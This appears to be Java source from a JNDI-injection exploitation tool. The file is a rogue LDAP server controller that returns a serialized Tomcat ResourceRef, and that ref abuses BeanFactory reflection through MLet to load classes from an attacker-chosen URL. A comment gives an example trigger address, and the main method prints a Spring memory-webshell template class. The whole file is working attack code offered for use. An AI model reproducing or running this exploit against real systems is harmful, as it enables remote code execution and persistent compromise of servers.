package com.feihong.ldap.controllers;

import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.exceptions.IncorrectParamsException;
import com.feihong.ldap.exceptions.UnSupportedPayloadTypeException;
import com.feihong.ldap.template.*;
import com.feihong.ldap.utils.*;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;

/*
ldap://x.x.x.x:1389/mlet
 */

@LdapMapping(uri = { "/tomcatmlet" })
public class TomcatMLetController implements LdapController {
    private PayloadType type;
    private String[] params;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println("[+] Sending LDAP ResourceRef result for " + base);

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = getResourceRefByTomcatMLet(params[0]);

        e.addAttribute("javaSerializedData", Util.serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));

        System.out.println("[+] Done Sending LDAP ResourceRef result");
    }

    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try{
            int firstIndex = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            if(secondIndex < 0) secondIndex = base.length();

            try{
                type = PayloadType.valueOf(base.substring(firstIndex + 1, secondIndex).toLowerCase());

                // 只支持这一种
                if(type != PayloadType.url){
                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + type);
                }

                System.out.println("[+] Paylaod: " + type);
            }catch(IllegalArgumentException e){
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(firstIndex + 1, secondIndex));
            }

            switch (type){
                case url:
                    String url = Util.getUrlFromBase(base);
                    System.out.println("[+] javax management url: " + url);
                    params = new String[]{url};    // 设置好url，待sendResult方法内使用
                    break;
            }
        }catch(Exception e){
            if(e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException)e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }

    private static ResourceRef getResourceRefByTomcatMLet(String manageUrl) {
        ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
        ref.add(new StringRefAddr("a", "javax.el.ELProcessor"));
        ref.add(new StringRefAddr("b", manageUrl + "/javax.management.loading.MLet"));
        ref.add(new StringRefAddr("c", "Blue"));
        return ref;
    }


    public static void main(String[] args) throws Exception {
        Class clazz = SpringMemshellTemplate.class;
        String classCode = Util.getClassCode(clazz);
        System.out.println(classCode);
    }
}